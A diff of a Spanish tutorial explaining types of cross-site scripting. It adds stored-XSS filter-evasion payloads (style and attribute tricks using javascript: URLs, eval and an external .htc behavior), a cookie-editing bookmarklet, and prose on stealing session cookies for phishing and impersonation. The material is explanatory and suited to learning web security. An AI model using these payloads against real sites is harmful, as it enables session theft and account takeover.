@@ -20,11 +20,6 @@ Referencia: [Tipos de XSS OWASP] (https://www.owasp.org/index.php/Types_of_Cross
 ###Causado por código en el lado del servidor (Java, PHP, .NET, etc.):
 Los ataques XSS tradicionales:
 + Reflejado (No Persistente) – se produce cuando el payload retorna de nuevo al usuario mediante la apertura de un link a un sitio web vulnerable con una entrada cambiada.
-+ Almacenado (Persistente) – se produce cuando el payload se almacena en el servidor y se recupera cada vez que un usuario solicita una página web.
-
-###Causado por código en el lado del cliente (Javascript, Visual Basic, Flash, etc.):
-También conocido como XSS DOM-based:
-+ Reflejado (No Persistente)- el mismo que se produce en el lado del servidor, pero esta vez, el payload es posible debido al procesamiento del código por el navegador.
 
 Supongamos que un sitio web tiene la siguiente forma y que al acceder se creará un documento HTML enlazando con un frame a menu.asp.
 __http://www.example.com/home.asp?frame=menu.asp__
@@ -34,17 +29,40 @@ javascript:while(1)alert("Este mensaje saldrá indefinidamente");
 ```
 Si este enlace lo pone un atacante hacia una víctima, un visitante podrá verlo y verá que es del mismo dominio, suponiendo que no puede ser nada malo y de resultado tendrá un bucle infinito de mensajes.
 Un atacante en realidad trataría de colocar un script que robe las cookies de la víctima, para después poder personificarse como con su sesión, o hacer automático el proceso con el uso de la biblioteca cURL o alguna similar. De esta forma, al recibir la cookie, el atacante podría ejecutar acciones con los permisos de la víctima sin siquiera necesitar su contraseña.
+
 Otro uso común para estas vulnerabilidades es lograr hacer phishing. Quiere ello decir que la víctima ve en la barra de direcciones un sitio, pero realmente está en otra. La víctima introduce su contraseña y se la envía al atacante.
-Una página como la siguiente:
-```
-error.php?error=Usuario%20Invalido
-```
-es probablemente vulnerable a XSS indirecto, ya que si escribe en el documento "Usuario Inválido", esto significa que un atacante podría insertar HTML y JavaScript si así lo desea.
-Por ejemplo, un tag como <script> que ejecute código javascript, cree otra sesión bajo otro usuario y mande la sesión actual al atacante.
+
+Una página como la siguiente: __error.php?error=Usuario%20Invalido__. es probablemente vulnerable a XSS indirecto, ya que si escribe en el documento "Usuario Inválido", esto significa que un atacante podría insertar HTML y JavaScript si así lo desea.
+Por ejemplo, un tag como ```<script>``` que ejecute código javascript, cree otra sesión bajo otro usuario y mande la sesión actual al atacante.
+
 Para probar vulnerabilidades de XSS en cookies, se puede modificar el contenido de una cookie de forma sencilla, usando el siguiente script. Sólo se debe colocar en la barra de direcciones, y presionar 'Enter'.
+
 ```
 javascript:void prompt("Introduce la cookie:",document.cookie).replace(/[^;]+/g,function(_){document.cookie=_;});
 ```
+
++ Almacenado (Persistente) – se produce cuando el payload se almacena en el servidor y se recupera cada vez que un usuario solicita una página web.
+
+Funciona localizando puntos débiles en la programación de los filtros de HTML si es que existen, para publicar contenido (como blogs, foros, etc.).
+
+Normalmente el atacante tratara de insertar tags como ```<iframe>```, o ```<script>```, pero en caso de fallar, el atacante puede tratar de poner tags que casi siempre están permitidas y es poco conocida su capacidad de ejecutar código. De esta forma el atacante podría ejecutar código malicioso.
+
+Ejemplos:
+
+Una posibilidad es usar atributos que permiten ejecutar código.
+```
+<BR SIZE="&{alert('XSS')}">
+<FK STYLE="behavior: url(http://yoursite/xss.htc);">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+```
+También se puede crear un DIV con background-image: url(javascript:eval(this.fu)) como estilo y añadir al DIV un campo llamado fu que contenga el código a ejecutar, por ejemplo:
+```<div fu="alert('Hola mundo');" STYLE="background-image: url(javascript:eval(this.fu))">```
+
+
+###Causado por código en el lado del cliente (Javascript, Visual Basic, Flash, etc.):
+También conocido como XSS DOM-based:
++ Reflejado (No Persistente)- el mismo que se produce en el lado del servidor, pero esta vez, el payload es posible debido al procesamiento del código por el navegador.
+
 + Almacenado (Persistente) – el mismo que se produce en el lado del servidor, pero esta vez, el payload es almacenado en la máquina del cliente, usando el almacenamiento del navegador.
 
 ###Causado por la infraestructura (navegador, plugins, servidores, etc.):
@@ -57,7 +75,4 @@ Muy raro, pero es el tipo más peligroso de XSS:
 Ocurre a menudo en estafas:
 + Auto-XSS – se produce cuando el usuario es responsable de la inyección del payload en el navegador para conseguir acceso para sí mismo, generalmente a través de la ingeniería social.
 
-
-
-
-Fuente: [https://blog.sucuri.net/espanol/author/rodolfo](https://blog.sucuri.net/espanol/author/rodolfo)
+Fuente: [https://blog.sucuri.net/espanol/author/rodolfo](https://blog.sucuri.net/espanol/author/rodolfo), [https://es.wikipedia.org/wiki/Cross-site_scripting](https://es.wikipedia.org/wiki/Cross-site_scripting)
